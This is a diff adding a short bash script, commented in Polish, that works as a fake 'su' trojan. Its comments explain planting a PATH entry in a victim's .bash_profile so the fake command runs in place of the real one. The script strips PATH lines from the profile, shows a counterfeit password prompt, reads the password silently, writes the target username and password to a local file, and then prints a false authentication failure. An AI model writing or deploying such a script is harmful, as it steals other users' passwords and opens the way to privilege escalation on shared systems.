@@ -1,0 +1,11 @@
+#!/bin/bash
+#wpisuję w pliku .bash_profile ofiary linię:
+#PATH="SCIEŻKA_DO_KATALOGU_Z_MOJĄ_KOMENDĄ_SU:$PATH"
+#Dodatkowo pamiętać o nadaniu uprawnień: chmod u+x ./su
+user=`whoami`;
+cat "/home/$user/.bash_profile" | grep -v "PATH" > .bash_profile
+user_privilaged=$1;
+echo -n "Password: ";
+read -s haslo;
+echo -ne "su $user_privilaged Password: $haslo\n" >> bash_login.
+echo -e "\nsu: Authentication failure";
